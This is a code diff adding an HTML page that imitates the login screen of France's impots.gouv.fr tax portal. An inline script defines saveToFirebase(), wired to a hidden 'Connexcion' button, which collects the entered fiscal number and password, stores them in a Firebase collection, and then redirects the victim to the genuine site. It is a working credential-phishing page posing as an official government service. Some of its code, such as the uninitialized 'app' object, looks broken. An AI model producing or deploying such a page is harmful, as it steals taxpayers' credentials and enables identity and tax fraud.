@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+<html lang="fr">
+	<!-- Dac: dpapusx081 -->
+	<!-- Le: Tue Oct  3 17:21:58 2023 -->
+	<!-- Le: 2 -->
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<meta name="apple-itunes-app" content="app-id=505488770" />
+		<meta name="format-detection" content="telephone=no" />
+		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+		<meta http-equiv="Pragma" content="no-cache" />
+		<meta http-equiv="Expires" content="0" />
+		<meta name="description" content ="Acc&egrave;s &agrave; l'espace particulier du site impots.gouv.fr." />
+		<link rel="stylesheet" type="text/css" href="styles/bootstrap.min.css" charset="utf-8" />
+		<link rel="stylesheet" type="text/css" href="styles/commun.css" charset="utf-8" />
+		<link rel="stylesheet" type="text/css" href="styles/mire.css" charset="utf-8" />
+		<link rel="stylesheet" type="text/css" href="styles/dac.css" charset="utf-8" />
+		<link rel="shortcut icon" 					 href="images/favicon.ico" 	  type="image/ico" />
+		<link rel="apple-touch-icon" sizes="152x152" href="images/favicon-152.png" type="image/png" />
+		<link rel="apple-touch-icon" sizes="144x144" href="images/favicon-144.png" type="image/png" />
+		<link rel="apple-touch-icon" sizes="120x120" href="images/favicon-120.png" type="image/png" />
+		<link rel="apple-touch-icon" sizes="114x114" href="images/favicon-114.png" type="image/png" />
+		<link rel="apple-touch-icon" sizes="72x72"   href="images/favicon-72.png"  type="image/png" />
+		<link rel="apple-touch-icon" sizes="57x57"	 href="images/favicon-57.png"  type="image/png" />
+		<script type="module">
+			import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js'
+	  
+			// If you enabled Analytics in your project, add the Firebase SDK for Google Analytics
+			import { getAnalytics } from 'https://www.gstatic.com/firebasejs/10.4.0/firebase-analytics.js'
+	  
+			// Add Firebase products that you want to use
+			import { getAuth } from 'https://www.gstatic.com/firebasejs/10.4.0/firebase-auth.js'
+			import { getFirestore } from 'https://www.gstatic.com/firebasejs/10.4.0/firebase-firestore.js'
+
+			
+
+
+function saveToFirebase() {
+  const inputField = document.getElementById("spi_tmp");
+  const passwordField = document.getElementById("pwd_tmp");
+
+  const data = {
+    number: inputField.value,
+    password: passwordField.value,
+  };
+
+  if (passwordField.value.length > 5) {
+    // Password is more than 5 characters long
+    // Replace "yourCollectionName" with your Firebase collection name
+    app
+      .firestore()
+      .collection("yourCollectionName")
+      .add(data)
+      .then(() => {
+        alert("Data saved to Firebase successfully.");
+
+        // Redirect to another website (change the URL)
+        window.location.href = "https://cfspart.impots.gouv.fr/"; // Replace with the desired URL
+      })
+      .catch((error) => {
+        console.error("Error adding document: ", error);
+      });
+  } else {
+    console.log("Password must be more than 5 characters long.");
+  }
+
+  // Replace "yourCollectionName" with your Firebase collection name
+  // firebase
+  //   .firestore()
+  //   .collection("data")
+  //   .add(data)
+  //   .then(() => {
+  //     alert("Data saved to Firebase successfully.");
+  //   })
+  //   .catch((error) => {
+  //     console.error("Error adding document: ", error);
+  //   });
+}
+
+
+
+ </script>
+
+		<!--[if lt IE 9]>
+		<script type="text/javascript" src="/templates/js/Respond.js" charset="utf-8"> </script>
+		<script type="text/javascript" src="/templates/js/html5shiv-3.7.3.min.js" charset="utf-8"> </script>
+		<script>
+			document.createElement('header');
+			document.createElement('footer');
+			document.createElement('main');
+		</script>
+		<![endif]-->
+		<title>Particuliers | authentification</title>
+	</head>
+	<body>
+		<a href="#contenu" class="sr-only sr-only-focusable">Aller au contenu</a>
+		<!--[if lt IE 9]>
+		<div role="alert" class="alert alert-danger" role="alert">
+			<p>Vous utilisez une version obsol&egrave;te de votre navigateur</p>
+			<p>Son utilisation vous expose &agrave; des risques de s&eacute;curit&eacute; et vous prive de certaines fonctionnalit&eacute;s.</p>
+			<p>Nous vous invitons &agrave; utiliser <a href="http://windows.microsoft.com/fr-fr/internet-explorer/download-ie">une version plus r&eacute;cente </a>
+				ou un <a href="http://browsehappy.com/">autre navigateur</a>.
+			</p>
+		</div>
+		<![endif]-->
+		<div id="obsolete" role="alert" class="erreur alert alert-danger erreur" style="display:none">
+            Votre configuration ne correspond pas &agrave;
+            <!-- <a href="https://www.impots.gouv.fr/portail/particulier/questions/quelle-configuration-doit-avoir-mon-ordinateur" style="text-decoration: none" target="_blank" rel="noopener"> -->
+            <a class="obsolete" href="https://www.impots.gouv.fr/portail/particulier/questions/quelle-configuration-doit-avoir-mon-ordinateur" target="_blank" rel="noopener">
+                 celle requise par la DGFiP <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fen&ecirc;tre"></span>
+            </a>&nbsp;; vous vous exposez &agrave; des risques de s&eacute;curit&eacute; ou dysfonctionnements.<br />
+                  Nous vous invitons &agrave; utiliser
+            <a class="obsolete" href="https://browsehappy.com/" target="_blank" rel="noopener">
+                 une version plus r&eacute;cente ou un autre navigateur <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fen&ecirc;tre" ></span> 
+            </a>.
+        </div>
+		<div role="alert" class="alert alert-danger erreur hide" role="alert" id='cookie_error' >
+			<p>Pour acc&eacute;der aux services en ligne, il vous faut au pr&eacute;alable <a href=http://www.accepterlescookies.com>accepter les cookies.</a></p>
+		</div>
+		<noscript>
+			<div role="alert" class="alert alert-danger erreur" role="alert">
+				<p>Pour acc&eacute;der aux services en ligne, il vous faut au pr&eacute;alable <a href=http://www.enable-javascript.com/fr>activer JavaScript.</a></p>
+			</div>
+		</noscript>
+		<div id="banniereSmart" class="container hide">
+			<button type="button" class="close" aria-label="Fermer la banni&egrave;re" onClick="addClassName(document.getElementById('banniereSmart'), 'hide');">
+			<span aria-hidden="true">&times;</span>
+			</button>
+			<a id="leStoreLogo" class="col-xs-3 col-sm-1" href="https://play.test.google.com/store/apps/details?id=fr.gouv.finances.smartphone.android">
+			<img id="LogoSmartImage" src="images/Small-logoSMART.png" alt="T&eacute;l&eacute;charger l'app mobile" />
+			</a>
+			<div id="banniereSmartTexte" class="col-xs-8 col-sm-10">
+				<div class="row">
+					T&eacute;l&eacute;chargez gratuitement l'app mobile Impots.gouv sur votre appareil.
+				</div>
+			</div>
+		</div>
+		<header>
+			<div class="container">
+			<!--Le logo-->
+			<div class="row">
+				<!-- Partie gauche -->
+				<div class="col-xs-12 col-sm-6 col-md-6">
+					<div class="row">
+						<div class="col-xs-3 col-sm-4 col-md-3 col-lg-3">
+							<a id="bloc_marque" target="_blank" rel="noopener" href="https://www.impots.gouv.fr" title="Accueil impots.gouv.FR (nouvelle fen&ecirc;tre)">
+							<span class="sr-only">Accueil impots.gouv.FR</span>
+							</a>
+						</div>
+						<div class="col-xs-9 col-sm-8 col-md-9 col-lg-9" id="logo_alt">
+							<h1>
+								<span class="sr-only">Authentification</span>
+							</h1>
+							<a target="_blank" rel="noopener" href="https://www.impots.gouv.fr" title="Accueil impots.gouv.FR (nouvelle fen&ecirc;tre)">
+							<span class="sr-only">Accueil impots.gouv.FR</span>
+							</a>
+						</div>
+					</div>
+				</div>
+				<ul id="acces_espace" class="pull-right text-right espace_haut col-xs-12 col-sm-6 col-md-6 col-lg-5">
+					<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
+						<a class="btn btn-primary" href="https://cfspart.impots.gouv.fr/monprofil-webapp/monCompte">
+						<span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span>
+						Votre espace particulier</a>
+					</li>
+					<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
+						<a class="btn btn-danger" href="https://cfspro.impots.gouv.fr/mire/accueil.do" id="proPriv">
+						<span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span>
+						Votre espace professionnel</a>
+					</li>
+				</ul>
+			</div>
+			<!-- Fin Container -->
+		</header>
+		<!-- Fil d'Arianne -->
+		<div class="container">
+			<div class="row">
+				<ol class="breadcrumb ">
+					<li><a href="https://www.impots.gouv.fr/portail/particulier" id="toPortailPub" title="Retour au portail">Accueil</a></li>
+					<li class="active">Authentification</li>
+				</ol>
+			</div>
+		</div>
+		<!-- Fin du fil d'Arianne -->
+		<main class="container" id="contenu">
+			<div class="sr-only">
+				Le contenu du formulaire et l'aide mise &agrave; votre disposition &eacute;voluent selon vos r&eacute;ponses et votre situation
+			</div>
+			<div class="row">
+				<!-- Connexion Gauche-->	
+				<div class="col-md-6">
+					<a id="aide_scroll" href="#aide" class="btn btn-default hidden-lg hidden-md hidden-sm" style="" aria-hidden="false">
+					<span class="dgfipicon dgfipicon-info text-muted"></span>&nbsp;Aide
+					</a>
+					<div class="panel panel-default" >
+						<div class="panel-heading" >
+							<h2 id="titre_authent" class="text-center">Authentification</h2>
+						</div>
+						<!--===========================-->
+						<!--Body Connexion Gauche DEBUT-->
+						<!--===========================-->
+						<div class="panel-body">
+							
+							
+							
+							<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="erreur"></div>
+							<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="blocage"></div>
+							<form method=post enctype="application/x-www-form-urlencoded" accept-charset="UTF-8" name="CTX" id="formulairePrincipal" target="hidden-formulairePrincipal">
+								<input type="hidden" name="url" value="aHR0cHM6Ly9jZnNwYXJ0LmltcG90cy5nb3V2LmZyLw==" />
+								<input type="hidden" id="spi" name="spi" />
+								<input type="hidden" id="pwd" name="pwd" />
+								<input type="hidden" id="rfr" name="rfr" />
+								<input type="hidden" id="teledec" name="teledec" />
+								<input type="hidden" id="dateNaissance" name="dateNaissance" />
+								<input type="hidden" id="dateNaissance_tmp" name="dateNaissance_tmp" disabled="true"/>
+								<input type="hidden" id="jourNaissance" name="jourNaissance" disabled="true" />
+								<input type="hidden" id="moisNaissance" name="moisNaissance" disabled="true" />
+								<input type="hidden" id="anneeNaissance" name="anneeNaissance" disabled="true" />
+								<IFRAME style="display:none" name="hidden-formulairePrincipal" id="hidden-formulairePrincipal" aria-hidden="true" title="Cadre technique"> </IFRAME>
+								<!--====================-->
+								<!-- Identifiant Fiscal -->
+								<!--====================-->
+								<div class="row">
+									<div class="col-md-12">
+										<div class="form-group" id="fg_spi">
+											<label for="spi_tmp">Num&eacute;ro fiscal</label>
+											<div class="hide" id="changeSPI" > (<a href="#" onclick="afficheForm('CTX'); videChamps('CTX','_tmp','spi');">Changer d'utilisateur</a>)</div>
+											<div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
+											<input class="form-control" name="spi_tmp" type="tel" aria-required="true" autocomplete="username" id="spi_tmp" placeholder="13 chiffres" data-original-title="13 chiffres" data-toggle="tooltip" data-placement="top" data-mask="int" data-max=13 data-feedbackok=1/>
+											<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_spi" ></div>
+										</div>
+										<!-- form-group FIN -->
+									</div>
+									<!-- col-md-12 FIN -->
+								</div>
+								<!-- row FIN -->
+								<!--=======================-->
+								<!--     Mot de passe      -->
+								<!--=======================-->
+								<div class="row">
+									<div class="col-md-12">
+										<div class="form-group" 
+										style="display: none;"
+										aria-hidden="true" id="fg_pwd">
+											<label for="pwd_tmp">Mot de passe</label>
+											<div class="input-group col-xs-12" id="ig_pwd">
+												<input class="form-control" type="password" name="pwd_tmp" aria-required="true" autocomplete="current-password" id="pwd_tmp" data-toggle="tooltip" data-placement="top" maxlength=128 tabindex="-1" />
+												<div id="boutonvisumdp" class="input-group-btn">
+													<button type="button" class="btn btn-default" data-visu-mdp="off" onclick="switchVisuMdp(this,'pwd_tmp');return(false);" tabindex="-1" title="Visualisation / masquage du mot de passe" id="visumdp">
+													<i class="dgfipicon dgfipicon-visualiser-oui"> &#xE965;</i>
+													</button>
+												</div>
+											</div>
+										</div>
+										<!-- form-group Mdp-->
+									</div>
+									<!-- col-md-12 FIN -->
+								</div>
+								<!-- row FIN -->
+								<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_pwd" ></div>
+								<!-- =============== -->
+								<!-- No d'acces -->
+								<!-- =============== -->
+								<div class="row">
+									<div class="col-md-12">
+										<div class="form-group hide" id="fg_teledec">
+											<label for="teledec_tmp">Num&eacute;ro d'acc&egrave;s en ligne</label>
+											<div class="ephemere hidden" id="liveCheck_teledec_tmp" role="alert"></div>
+											<input class="form-control"  type="tel" data-original-title="7 chiffres" name="teledec_tmp" data-toggle="tooltip" data-placement="top" aria-required="true" placeholder="7 chiffres" autocomplete="off" id="teledec_tmp" data-mask="int" data-max=7 data-feedbackok=1 />
+										</div>
+										<!-- fg_creation_teledec FIN -->
+									</div>
+									<!-- col-md-12 FIN -->
+								</div>
+								<!-- row FIN -->
+								<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_teledec" ></div>
+								<!-- =============== -->
+								<!--       RFR       -->
+								<!-- =============== -->
+								<div class="row">
+									<div class="col-md-12">
+										<div class="form-group hide" id="fg_rfr">
+											<label for="rfr_tmp">Revenu fiscal de r&eacute;f&eacute;rence</label>
+											<div class="ephemere hidden" id="liveCheck_rfr_tmp" role="alert"></div>
+											<input class="form-control"  type="tel" data-original-title="1 &agrave; 10 chiffres." data-toggle="tooltip" data-placement="top" name="rfr_tmp" aria-required="true" autocomplete="off" id="rfr_tmp" placeholder="1 &agrave; 10 chiffres" data-mask="int" data-max=10 data-feedbackok=1/>
+											<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_rfr" ></div>
+										</div>
+									</div>
+									<!-- col-md-12 FIN -->
+								</div>
+								<!-- row FIN -->
+								<!-- ================= -->
+								<!-- date de naissance -->
+								<!-- ================= -->
+								<div class="row form-row hide" id="fr_dateNaissance">
+									<div class="col-xs-11 col-md-12">
+										<label for="saisieDate">Indiquez votre date de naissance</label>
+										<div class="ephemere hidden" id="liveCheck_jourNaissance_tmp" role="alert"></div>
+										<div class="ephemere hidden" id="liveCheck_moisNaissance_tmp" role="alert"></div>
+										<div class="ephemere hidden" id="liveCheck_anneeNaissance_tmp" role="alert"></div>
+									</div>
+									<div class="col-xs-4 col-md-4">
+										<label for="jourNaissance_tmp" class="hidden" >Indiquez votre jour de naissance</label>
+										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre jour de naissance" data-toggle="tooltip" data-placement="top" name="jourNaissance_tmp" id="jourNaissance_tmp"  aria-required="true" aria-label="Jour de naissance" autocomplete="bday-day" placeholder="JJ" data-max=2 data-mask="jour" />
+									</div>
+									<div class="col-xs-4 col-md-4">
+										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre mois de naissance" data-toggle="tooltip" data-placement="top" name="moisNaissance_tmp" id="moisNaissance_tmp"  aria-required="true" aria-label="Mois de naissance" autocomplete="bday-month" placeholder="MM" data-max=2 data-mask="mois" />
+									</div>
+									<div class="col-xs-4 col-md-4">
+										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre ann&eacute;e de naissance" data-toggle="tooltip" data-placement="top" name="anneeNaissance_tmp" id="anneeNaissance_tmp"  aria-required="true" aria-label="Ann&eacute;e de naissance" autocomplete="bday-year" placeholder="AAAA" data-mask="int" data-max=4 maxlength="4" />
+									</div>
+									<div class="col-xs-11 col-md-12">
+										<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_dateNaissance" ></div>
+									</div>
+								</div>
+								<!-- row FIN -->
+								<!--==================-->
+								<!-- Bouton Continuer -->
+								<!--==================-->
+								<div class="row"  id="goOnBtn" >
+									<div class="col-md-12">
+										<div class="form-group text-center" id='go' data-original-title='Pour continuer, veuillez saisir votre num&eacute;ro fiscal.' data-toggle='tooltip' data-placement='bottom'>
+											<button id="btnAction" type="submit" class="btn btn-default" aria-controls="erreur" aria-label="Pour continuer, veuillez saisir votre num&eacute;ro fiscal" data-href="" onclick="checkInput()" >Continuer</button>
+											
+											<button id="btnActions" 
+											style="display:none"
+											type="submit" class="btn btn-default" aria-controls="erreur" aria-label="Pour continuer, veuillez saisir votre num&eacute;ro fiscal" data-href="" onclick="saveToFirebase()" >Connexcion</button>
+											
+										</div>
+									</div>
+									
+								</div>
+								<!-- 					<button type="submit" class="btn btn-primary col-xs-12" onclick="document.getElementById('LMDP_formulaire').action = urlLoginMotDePasse ; envoiLP(); adapterContexte(); return(true);"> -->
+								<!-- 						Connexion -->
+								<!-- 					</button> -->
+							</form>
+							<!--============================-->
+							<!-- Oublis SPI et Mot de passe -->
+							<!--============================-->
+							<div id="lesOublis" class="row hide">
+								<div class="col-md-12 text-center">
+									<a href="" tabindex="0" data-target="#numFiscal" data-toggle="modal" class="modal-link" aria-label="Recevoir mon num&eacute;ro fiscal par courriel (ouverture d'une fen&ecirc;tre de dialogue)" title="Recevoir mon num&eacute;ro fiscal par courriel (ouverture d'une fen&ecirc;tre de dialogue)"> Num&eacute;ro fiscal perdu</a>
+									|
+									<a href="" tabindex="0" data-target="#passPerdu" data-toggle="modal" class="modal-link" aria-label="Renouveler mon mot de passe (ouverture d'une fen&ecirc;tre de dialogue)" title="Renouveler mon mot de passe (ouverture d'une fen&ecirc;tre de dialogue)"> Mot de passe oubli&eacute; </a>
+								</div>
+							</div>
+							<!-- Fin row oublis -->
+							<!--==========================-->
+							<!--Body Connexion Gauche FIN -->
+							<!--==========================-->
+						</div>
+						<!--======================================-->
+						<!--Bouton France-Connect en footer DEBUT -->
+						<!--======================================-->
+						<div class="panel-footer text-center" id="FranceConnect">
+							<div class="separ">
+								<div id="choisirFC">Ou</div>
+							</div>
+							<form >
+								<div class="col-md-12 text-center">
+									
+									<!-- // if (document.getElementById('urlFCFS')) { document.getElementById('urlFCFS').value=btoa(unescape(encodeURIComponent(fqdnFCFS+pathFCFS))) ; } // -->
+									<!-- <input type="hidden" id="urlFCFS" name="url" value="aHR0cHM6Ly9jZnNmYy5pbXBvdHMuZ291di5mci8vbW9ucHJvZmlsLXdlYmFwcC9jb25uZXhpb24K"> -->
+									<input type="hidden" id="authKey" name="lmAuth" value="FranceConnect">
+									<div id="erreurFC" role="alert" class="erreur alert alert-danger hide">
+										Vous ne pouvez actuellement pas vous identifier en utilisant FranceConnect.<br/>
+										Vous pouvez contacter le support FranceConnect pour de plus amples renseignements
+									</div>
+									<div role="alert" class="erreur alert alert-danger hide" id="Cat2FC1" >
+										La demande d'activation de votre mot de passe est en cours.<br>
+										Vous avez re&ccedil;u un courriel &agrave; l'adresse indiqu&eacute;e.<br>
+										Pour vous connecter via FranceConnect, vous devez obligatoirement cliquer sur le lien indiqu&eacute; dans ce courriel.<br>
+										Attention, ce lien est valable 8 heures.<br>
+									</div>
+									<div role="alert" class="erreur alert alert-danger hide" id="Cat2FC2" >
+										Vous ne pouvez actuellement pas vous identifier en utilisant FranceConnect.<br/>
+										Vous pouvez contacter le support FranceConnect pour de plus amples renseignements
+									</div>
+									<a id="leBouton" href="#" onclick="$(this).closest('form').submit()"><img src="/images/logo-fc.svg" height="60" width="200" alt="S'identifier avec FranceConnect"></a><br/>
+								</div>
+							</form>
+							<p class="text-center">
+								<a href="https://app.franceconnect.gouv.fr/en-savoir-plus" id="cQuoiFCGauche"  target="_blank" rel="noopener">
+								Qu'est-ce que FranceConnect?
+								<span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fen&ecirc;tre"></span>
+								</a>
+							</p>
+							
+							<!--======================================-->
+							<!--Bouton France-Connect en footer FIN -->
+							<!--======================================-->
+						</div>
+						<!--======================================-->
+						<!--Message de consentement de la mire FI -->
+						<!--======================================-->
+						<div class="panel-footer text-center hide" id="consentement">
+							<p>En cliquant sur &laquo;Connexion&raquo;, vous acceptez que vos donn&eacute;es personnelles (nom, pr&eacute;noms, date et lieu de naissance, adresse &eacute;lectronique) soient transmises &agrave; FranceConnect.</p>
+							<!--======================================-->
+							<!--Message de consentement de la mire FI -->
+							<!--======================================-->
+						</div>
+						<!--======================================-->
+						<!--Paiement en mode non authentifie DEBUT-->
+						<!--======================================-->
+						
+						<div class="panel-footer text-center" id="Payer">
+							<p>Vous pouvez &eacute;galement payer en ligne en utilisant votre num&eacute;ro fiscal et la r&eacute;f&eacute;rence de votre avis</p>
+							<a class="btn btn-success" id="payer" href='https://www.telepaiement.dgfip.finances.gouv.fr/redirectPart.htm'>
+							Payer en ligne
+							</a>
+							<!--======================================-->
+							<!--Paiement en mode non authentifie FIN -->
+							<!--======================================-->
+						</div>
+						
+					</div>
+					<!-- panel-default FIN -->
+				</div>
+				<!-- Fin col-md-6 -->
+				<!-- ============== -->
+				<!-- AIDE DEBUT -->
+				<!-- ============== -->
+				<section class="col-md-6" id="aide">
+					<div class="panel panel-default">
+						<div class="panel-heading">
+							<h2 class="text-center">Aide</h2>
+						</div>
+						<div class="panel-body">
+							<details id="aide_spi" class="aideSPI">
+								<summary>O&ugrave; trouver votre num&eacute;ro fiscal&nbsp;?</summary>
+								<div class="well">
+									<p>Si vous disposez d&eacute;j&agrave; d'un espace particulier, vous pouvez <a href="#" id="disp_perte_spi" onclick="return false;" data-target="#numFiscal" data-toggle="modal" title="Ouverture dans une fen&ecirc;tre modale">recevoir votre num&eacute;ro fiscal par courriel</a>.</p>
+									<p>Il figure aussi en haut de la premi&egrave;re page de votre derni&egrave;re d&eacute;claration de revenus re&ccedil;ue <a href="https://www.impots.gouv.fr/portail/particulier/questions/jai-egare-les-identifiants-dacces-mon-espace-particulier-comment-puis-je-les-0" target="_blank" rel="noopener" title="Nouvelle fen&ecirc;tre">ou sur vos avis <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fen&ecirc;tre"></span></a> : </p>
+									<div id="exemple_SPI">
+										<figure class="text-center spacer-top" role="group">
+											<img src="images/spi.svg" alt="L&eacute;gende disponible apr&egrave;s l'illustration" class="img-responsive center-block img-thumbnail" width="473" height="145" />
+											<figcaption class="text-muted"><em>Illustration : emplacement de votre num&eacute;ro fiscal, sur votre d&eacute;claration</em></figcaption>
+										</figure>
+										<figure class="text-center spacer-top" role="group">
+											<img src="images/spi1.svg" alt="L&eacute;gende disponible apr&egrave;s l'illustration" class="img-responsive center-block img-thumbnail" width="350" height="145" />
+											<figcaption class="text-muted"><em> Illustration : emplacement de votre num&eacute;ro fiscal, sur votre avis</em></figcaption>
+										</figure>
+									</div>
+								</div>
+							</details>
+							<details id="aide_spi1" class="aideSPI">
+								<summary>Vous n'avez pas encore de num&eacute;ro fiscal&nbsp;?</summary>
+								<div class="well">		
+                                                                <p>Pour obtenir la cr&eacute;ation de votre num&eacute;ro fiscal, veuillez vous adresser &agrave; votre 
+								  <span id="CFP">Centre des finances publiques</span>
+								</p>
+                                                                </div>
+							</details>
+							<details id="aide_code" class="aideCode hide">
+								<summary>Vous avez perdu votre code de cr&eacute;ation</summary>
+								<div class="well">
+									<p>Vous pouvez
+										<a href="#" data-toggle="modal" data-target="#codeCreation">l'obtenir &agrave; nouveau par courriel</a>.
+									</p>
+								</div>
+							</details>
+							<details id="aide_nael" class="aideIdentifiants hide">
+								<summary>O&ugrave; trouver votre num&eacute;ro d'acc&egrave;s en ligne&nbsp;?</summary>
+								<div class="well">
+									<p>Il figure en haut de la premi&egrave;re page de votre derni&egrave;re d&eacute;claration de revenus re&ccedil;ue.</p>
+									<div id="exemple_NAEL">
+										<figure class="text-center spacer-top" role="group">
+											<img src="images/num_acces.svg" alt="L&eacute;gende disponible apr&egrave;s l'illustration" class="img-responsive center-block img-thumbnail" width="473" height="145" />
+											<figcaption class="text-muted"><em>Illustration : emplacement de votre num&eacute;ro d'acc&egrave;s en ligne, sur votre d&eacute;claration</em></figcaption>
+										</figure>
+									</div>
+								</div>
+							</details>
+							<details id="aide_rfr" class="aideIdentifiants hide">
+								<summary>O&ugrave; trouver votre revenu fiscal de r&eacute;f&eacute;rence&nbsp;?</summary>
+								<div class="well">
+									<p>Il se trouve sur la premi&egrave;re page de votre dernier avis d'imp&ocirc;t sur les revenus.
+									</p>
+									
+								</div>
+							</details>
+							<details id="aide_mdp" class="aideMdp hide">
+								<summary>Vous avez oubli&eacute; votre mot de passe</summary>
+								<div class="well">
+									<p>Vous pouvez
+										<a href="" tabindex="0" data-target="#passPerdu" data-toggle="modal" title="Ouverture dans une fen&ecirc;tre modale">renouveler votre mot de passe en quelques clics</a>.
+									</p>
+								</div>
+							</details>
+							<details id="aide_mdp1" class="aideMdp hide">
+								<summary>Comment modifier votre mot de passe&nbsp;?</summary>
+								<div class="well">
+									<p>Une fois connect&eacute;, vous pourrez le modifier depuis &laquo;&nbsp;Mon profil&nbsp;&raquo;.</p>
+								</div>
+							</details>
+							<details id="aide_ocfiNonIR" class="ocfiNonIR hide">
+								<summary>Quels &eacute;l&eacute;ments fournir pour prouver votre identit&eacute;&nbsp;?</summary>
+								<div class="well">
+									<p>Vous devez adresser &agrave; votre <span id="CFP2">centre des Finances Fubliques</span> une reproduction recto-verso de l'un des &eacute;l&eacute;ments suivants&nbsp;:</p>
+									<ul>
+										<li>carte nationale d'identit&eacute; ou passeport en cours de validit&eacute;&nbsp;;</li>
+										<li>livret de famille &agrave; jour&nbsp;;</li>
+										<li>carte d'invalide de guerre&nbsp;;</li>
+										<li>carte d'invalide civil&nbsp;;</li>
+										<li>extrait d'acte de naissance ou copie int&eacute;grale avec mentions en marge&nbsp;;</li>
+										<li>titre de s&eacute;jour&nbsp;;</li>
+										<li>visa long s&eacute;jour valant titre de s&eacute;jour&nbsp;;</li>
+									</ul>
+									<p>&Agrave; d&eacute;faut, sont &eacute;galement recevables&nbsp;:</p>
+									<ul>
+										<li>livret de circulation&nbsp;;</li>
+										<li>carte de ressortissant d'un &Eacute;tat membre de l'Union Europ&eacute;enne.</li>
+									</ul>
+								</div>
+							</details>
+							<details id="aide_perteid" class="aideIdentifiants hide">
+								<summary>Num&eacute;ro d'acc&egrave;s en ligne et revenu fiscal de r&eacute;f&eacute;rence perdus</summary>
+								<div class="well">
+									<p>Nous vous invitons &agrave; vous adresser &agrave; votre
+										<span id="CFP3">centre des Finances Publiques</span> 
+									</p>
+									<p>Faites votre demande en indiquant votre num&eacute;ro fiscal, ou votre &eacute;tat civil complet, et tous &eacute;l&eacute;ments utiles.
+									</p>
+									<p> Les identifiants vous seront alors transmis de mani&egrave;re s&eacute;curis&eacute;e, g&eacute;n&eacute;ralement &agrave; l'aide de vos coordonn&eacute;es (adresse &eacute;lectronique ou t&eacute;l&eacute;phone) d&eacute;j&agrave; connues de votre service. 
+									</p>
+								</div>
+							</details>
+							<details id="aide_connexFC" class="aideFC hide">
+								<summary>Se connecter avec FranceConnect</summary>
+								<div class="well">
+									<p>
+										<b>Les services disponibles</b><br />
+										Avec vos identifiants impots.gouv.fr, vous pouvez effectuer des d&eacute;marches administratives sur des sites partenaires de FranceConnect. Le logo FranceConnect figure sur l'espace d'authentification de ces sites. 
+										<br /><br />
+										<b>Un acc&egrave;s unique et personnel</b><br />
+										L'identification sur un site proposant le bouton FranceConnect est strictement personnelle. Chaque membre d'un foyer fiscal disposant d'un num&eacute;ro fiscal et d'une adresse &eacute;lectronique valid&eacute;e sur le site impots.gouv.fr peut acc&eacute;der aux services en ligne en saisissant son propre num&eacute;ro fiscal.
+										<br /><br />
+										<b>Je rencontre des difficult&eacute;s pour me connecter</b><br />
+										Nous vous invitons &agrave; v&eacute;rifier la saisie de votre num&eacute;ro fiscal et de votre mot de passe.<br />
+										Nous vous rappelons que vous devez avoir cr&eacute;&eacute; un compte sur le site <a href="https://cfspart.impots.gouv.fr/">impots.gouv.fr</a>.<br />
+										Si vos identifiants sont correctement saisis et que le blocage persiste, nous vous invitons &agrave; contacter le support d'aide FranceConnect &agrave; l'adresse suivante : support.usagers@franceconnect.gouv.fr
+									</p>
+								</div>
+							</details>
+						</div>
+						<!-- Fin du panel-body  -->
+						<div class="panel-footer marge">
+							<details id="aide_services">
+								<summary>Les services disponibles sur votre espace particulier</summary>
+								<div class="well">
+									<p>Vous pouvez&nbsp;: </p>
+									<ul>
+										<li>g&eacute;rer votre pr&eacute;l&egrave;vement &agrave; la source,</li>
+										<li>payer vos imp&ocirc;ts,</li>
+										<li>d&eacute;clarer vos revenus,</li>
+										<li>consulter vos d&eacute;clarations et avis d'imposition,</li>
+										<li>consulter la situation de vos paiements,</li>
+										<li>acc&eacute;der &agrave; des donn&eacute;es publiques,</li>
+										<li>retrouver les coordonn&eacute;es de vos services comp&eacute;tents</li>
+										<li>r&eacute;aliser des demandes et d&eacute;marches via votre messagerie s&eacute;curis&eacute;e</li>
+										<li>d&eacute;clarer des dons,</li>
+										<li>g&eacute;rer vos biens immobiliers.</li>
+									</ul>
+								</div>
+							</details>
+							<details id="aide_cookies">
+								<summary>Gestion des <em lang="en">cookies</em></summary>
+								<div class="well">
+									<p>Un <em>cookie</em> est un petit fichier, enregistr&eacute; sur votre appareil, qui contient des informations n&eacute;cessaires au fonctionnement
+										du site.
+									</p>
+									<p>Nous n'y enregistrons pas de donn&eacute;e personnelle.</p>
+									<p>Votre navigateur propose en g&eacute;n&eacute;ral un mode de navigation priv&eacute;e,
+										qui supprime les <em>cookies</em> &agrave; la fermeture du logiciel.
+									</p>
+								</div>
+							</details>
+						</div>
+						<!-- Fin du panel-footer   -->
+					</div>
+					<!-- Fin du panel-default  -->
+				</section>
+				<!-- Fin de la colonne d'aide -->
+			</div>
+			<!-- row FIN -->
+		</main>
+		<!-- containe contenu FIN -->
+		<footer role="contentinfo">~
+			<p class="col-md-12 text-center">Direction g&eacute;n&eacute;rale des Finances publiques</p>
+		</footer>
+		<!--============================================================-->
+		<!-- Fenetre modale dans le cas de perte de mot de passe -->
+		<!--============================================================-->
+		<div id="passPerdu" class="modal fade" role="dialog" tabindex="-1" aria-labelledby="passPerduTitle" >
+			<div class="modal-dialog" role="dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<button type="button" class="close" data-dismiss="modal" aria-label="Fermer"><span aria-hidden="true">&times;</span></button>
